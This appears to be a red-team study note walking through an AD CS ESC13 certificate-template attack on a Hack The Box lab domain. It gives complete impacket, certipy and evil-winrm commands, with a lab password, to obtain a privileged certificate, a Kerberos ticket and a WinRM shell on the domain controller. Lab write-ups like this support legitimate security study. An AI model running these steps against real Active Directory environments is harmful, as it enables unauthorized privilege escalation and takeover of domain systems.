---
title: ADCS Attack(ESC13)
parent: Active Directory
grand_parent: Red Team
nav_order: 301
---
# ADCS Attack (ESC13)

## Attack Flow

Find vulnerable template → Request certificate → Authenticate (PKINIT) → Get TGT → Lateral Movement

## Add hosts
```zsh
sudo vi /etc/hosts
```

```zsh
cat /etc/hosts | grep ping.htb
```

## Preparation

### Get Ticket
```zsh
faketime 'now + 8 hours' impacket-getTGT  ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.50.56
```
Output:
- .ccache (Kerberos ticket)

## 1. certipy find
Purpose: Enumerate exploitable certificate templates

What it does:

Enumerate CAs and templates registered in AD CS
Analyze the settings of each template
Determine which templates are vulnerable (ESC1–ESC13)

Specifically:

ENROLLEE_SUPPLIES_SUBJECT
Client Authentication
Any Purpose
Authenticated Users enrollment enabled

It automatically determines whether a template can be used for privilege escalation by checking flags like these

👉 Key points to look for in the output:

Vulnerable: True
ESC13 (the main target of this PingPong attack)
Template name (e.g., TemporaryWinRM)
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime 'now + 8 hours' certipy-ad find -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-ip 10.129.50.56 -vulnerable -enabled -text
```


## 2. certipy req
Role: Certificate Issuance (Request)

What it does:

Submits a certificate request to the CA using the specified template
If the conditions are met, the certificate is issued

In the context of this exercise (ESC13):

The template is mapped to a specific group
→ When the certificate is obtained, the user is treated as that group

In other words:
👉 “Phase for obtaining a privileged certificate”

Output:

.pfx file (private key + certificate)
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime 'now + 8 hours' certipy-ad req -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.50.56 \
    -ca ping-DC1-CA -template TemporaryWinRM
```


## 3. certipy auth
Role: Kerberos authentication using a certificate (TGT acquisition)

What it does:

Performs PKINIT authentication using a .pfx file
Performs “certificate login” against AD
Acquires a Kerberos TGT

Result:

A .ccache file is generated

👉 This is super important:
It converts
“certificate → Kerberos ticket” without requiring a password
```zsh
faketime 'now + 8 hours' \
    certipy-ad auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb \
    -dc-ip 10.129.50.56 
```


```zsh
vi krb5_pingpong.conf
```
## Kerberos Config (if needed)

Required when:
- realm resolution fails
- DNS is not properly configured

```zsh
cat krb5_pingpong.conf
```

```
[libdefaults]
    default_realm = PING.HTB

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
```

```zsh
export KRB5_CONFIG=krb5_pingpong.conf  
```

```zsh
KRB5CCNAME=c.roberts.ccache \
faketime 'now + 8 hours' \
evil-winrm -i dc1.ping.htb -r ping.htb
```
